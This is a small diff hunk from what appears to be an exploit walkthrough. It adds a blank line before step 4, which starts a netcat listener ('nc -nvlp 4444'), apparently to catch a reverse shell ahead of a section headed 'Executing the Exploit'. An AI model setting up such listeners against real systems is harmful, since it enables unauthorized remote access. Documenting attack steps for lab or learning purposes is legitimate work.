@@ -166,6 +166,7 @@ except:
  ```
 
 4. Start a netcat listener.
+
 nc -nvlp 4444
 
 ### 5. Executing the Exploit
